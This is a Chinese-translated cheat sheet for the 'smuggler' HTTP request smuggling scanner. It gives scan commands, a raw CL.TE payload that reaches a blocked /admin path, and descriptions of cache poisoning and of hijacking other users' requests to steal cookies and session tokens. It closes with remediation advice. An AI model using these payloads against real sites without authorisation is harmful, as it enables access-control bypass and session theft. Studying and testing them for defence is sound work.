<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📦 走私者 - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
  ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
  ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
             High-Performance HTTP Request Smuggling Scanner
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/smuggler-HTTP_Smuggling-blue?style=for-the-badge" alt="smuggler">
  <img src="https://img.shields.io/badge/Author-Evan_Ricaurte-orange?style=for-the-badge" alt="defparam">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="网络安全">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p对齐=“中心”>
  <b>📦超快速、模块化 Python 工具，旨在检测和验证现代 Web 基础设施中的 HTTP 请求走私漏洞（CL.TE、TE.CL 和标头突变不同步）</b>
</p>

---

## 📋 目录

- [概述和 HTTP 走私理论](#-overview--http-smuggling-theory)
  - [CL.TE 与 TE.CL 差异](#clte-vs-tecl-discrepancy)
- [安装](#-安装)
- [基本目标扫描](#-basic-target-scanning)
- [扫描配置和突变引擎](#-scan-configurations--mutation-engines)
  - [默认与详尽扫描](#default-vs-exhaustive-scan)
  - [自定义标头和 Cookie](#custom-headers--cookies)
- [多目标和管道扫描](#-multi-target--pipeline-scanning)
- [分析结果和利用路径](#-analyzing-results--exploitation-paths)
  - [通过走私造成的缓存中毒](#cache-poisoning-via-smuggling)
  - [绕过前端安全控制](#bypassing-front-end-security-controls)
  - [劫持其他用户的请求](#hijacking-other-users-requests)
- [快速参考表](#-quick-reference-table)
- [防御考虑与补救](#-defective-considerations--remediation)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 HTTP 走私理论

当前端代理/负载均衡器和后端 Web 服务器在 HTTP 请求的边界上不一致时，就会发生 HTTP 请求走私：

### CL.TE 与 TE.CL 差异
- **CL.TE:** 前端使用`Content-Length`，后端使用`Transfer-Encoding: chunked`。
- **TE.CL:** 前端使用`Transfer-Encoding: chunked`，后端使用`Content-Length`。
- **TE.TE：** 两者都支持 `Transfer-Encoding`，但可以通过标头混淆（例如 `Transfer-Encoding: xchunked`、制表符或行折叠）来欺骗人们忽略它。

由 **defparam (Evan Ricaurte)** 创建，**smuggler** 注入精心设计的有效负载，以观察时间延迟或去同步响应，而不会破坏后端服务的稳定性。

---

## 📥 安装
```bash
# Clone the repository
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Run using Python 3
python3 smuggler.py -h
```
---

## 🚀 基本目标扫描

扫描单个 Web 应用程序端点：
```bash
# Basic scan against a single target
python3 smuggler.py -u https://target.com/
```
默认情况下，走私者使用安全定时有效负载测试 `CL.TE` 和 `TE.CL` 行为。

---

## ⚙️ 扫描配置和突变引擎

### 默认扫描与彻底扫描
Smuggler 包含不同的有效负载配置文件：
- **默认配置文件：** 快速、常见的异步突变。
- **详尽的配置文件：** 全面的突变测试空白变化、多个标头和混淆的传输编码标头：
```bash
# Run exhaustive scan testing all mutation gadgets
python3 smuggler.py -u https://target.com/ -c exhaustive
```
### 自定义标头和 Cookie
当需要身份验证或特定主机标头时：
```bash
python3 smuggler.py -u https://target.com/api/ \
  -H "Cookie: session=xyz123" \
  -H "X-Forwarded-Host: target.com"
```
---

## 🌐 多目标和管道扫描

将从 `httpx` 或 `subfinder` 发现的端点直接传送到走私者中：
```bash
# Scan a list of URLs from file
python3 smuggler.py -f live_hosts.txt -t 10

# Adjust timeout per probe (default: 10s)
python3 smuggler.py -u https://target.com/ --timeout 5
```
---

## 💥 分析结果和利用路径

当走私者报告阳性匹配时：
```text
[CRITICAL] CL.TE Desync Detected: https://target.com/
```
### 通过走私造成缓存中毒
走私一个生成异地重定向（例如主机标头操作）的请求，以毒害为所有用户提供 JavaScript 库的 Web 缓存。

### 绕过前端安全控制
如果前端代理阻塞了`/admin`，则走私一个二次内部请求，无需代理检查，直接到达后端：
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```
### 劫持其他用户的请求
走私 HTTP 请求的前缀。当下一个用户发送他们的请求时，它会附加到您的走私请求中，从而暴露他们的 cookie 和会话令牌。

---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **快速单一目标** | `python3 smuggler.py -u https://target.com/` |
| **详尽的深度扫描**| `python3 smuggler.py -u https://target.com/ -c exhaustive` |
| **扫描目标列表** | `python3 smuggler.py -f targets.txt -t 15` |
| **自定义标头/Cookie**| `python3 smuggler.py -u <URL> -H "Cookie: sess=123"` |
| **自定义超时** | `python3 smuggler.py -u <URL> --timeout 15` |

---

## 🛡️ 防御注意事项和补救措施

1. **强制执行 HTTP/2 或 HTTP/3 端到端：** HTTP/2 定义明确的帧长度，消除标头歧义。
2. **规范化 HTTP 标头：** 配置反向代理以拒绝同时包含 `Content-Length` 和 `Transfer-Encoding` 的请求。
3. **删除不明确的突变：** 删除带有模糊 `Transfer-Encoding` 标头的请求（例如，冒号前的空格、多个值）。

---

## ⚠️ 法律免责声明

> [!警告]
> HTTP 请求走私可能会破坏实时后端队列并毒害共享缓存节点。走私者必须专门用于明确授权的测试目标，并获得资产所有者的严格许可。